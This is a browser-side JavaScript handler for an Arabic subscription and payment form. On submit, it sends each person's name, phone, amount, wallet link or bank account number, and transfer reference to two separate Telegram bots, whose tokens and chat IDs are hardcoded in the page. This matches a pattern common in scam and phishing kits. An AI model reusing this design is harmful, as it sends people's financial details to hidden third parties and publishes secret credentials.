function toggleFields() {
  const method = document.getElementById('paymentMethod').value;
  document.getElementById('walletField').style.display = method === 'wallet' ? 'block' : 'none';
  document.getElementById('bankField').style.display = method === 'bank' ? 'block' : 'none';
  document.getElementById('refField').style.display = 'block';
}

document.getElementById("subscriptionForm").addEventListener("submit", function(e) {
  e.preventDefault();

  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const amount = document.getElementById("amount").value.trim();
  const currency = document.getElementById("currency").value;
  const method = document.getElementById("paymentMethod").value;

  const walletLink = document.getElementById("walletLink").value.trim();
  const bankAccount = document.getElementById("bankAccount").value.trim();
  const refNumber = document.getElementById("refNumber").value.trim();

  // تحقق من صحة المدخلات
  if (method === "wallet" && (!walletLink.startsWith("https://") || walletLink.length < 10)) {
    alert("⚠️ رابط المحفظة غير صحيح!");
    return;
  }

  if (method === "bank" && (!/^\d{10,}$/.test(bankAccount))) {
    alert("⚠️ رقم الحساب البنكي غير صحيح!");
    return;
  }

  if (refNumber.length < 4) {
    alert("⚠️ أدخل الرقم المرجعي للتحويل.");
    return;
  }

  // إنشاء الرسالة
  const msg = `📝 تسجيل جديد:
👤 الاسم: ${name}
📱 الجوال: ${phone}
💰 المبلغ: ${amount} ${currency}
💳 طريقة الدفع: ${method === 'wallet' ? 'محفظة' : 'حساب بنكي'}
${method === 'wallet' ? '🔗 رابط المحفظة: ' + walletLink : '🏦 رقم الحساب: ' + bankAccount}
🆔 الرقم المرجعي: ${refNumber}`;

  // إرسال إلى تيليجرام
  const token1 = "7492439814:AAGtH6r5nwkCNuDoCfF3YjZfH5T4kDtZ7Xs";
  const chat1 = "7646652113";
  const token2 = "7845317851:AAHVPaii4nCsquxu6x3d9Xk7oxYM5pZYuo8";
  const chat2 = "7801802191";

  fetch(`https://api.telegram.org/bot${token1}/sendMessage?chat_id=${chat1}&text=${encodeURIComponent(msg)}`);
  fetch(`https://api.telegram.org/bot${token2}/sendMessage?chat_id=${chat2}&text=${encodeURIComponent(msg)}`);

  // عرض رابط الدفع المناسب للمستخدم
  const response = document.getElementById("responseMsg");
  if (method === 'wallet') {
    response.innerHTML = `
      ✅ تم إرسال البيانات بنجاح.<br>
      الرجاء الدفع إلى عنوان المحفظة التالي:<br>
      <strong><a href="https://example.com/wallet" target="_blank">https://example.com/wallet</a></strong>
    `;
  } else if (method === 'bank') {
    response.innerHTML = `
      ✅ تم إرسال البيانات بنجاح.<br>
      الرجاء تحويل المبلغ إلى رقم الحساب التالي:<br>
      <strong>SA12345</strong>
    `;
  }

  // يمكنك أيضاً تصفية النموذج أو تعطيله بعد الإرسال إن أردت
});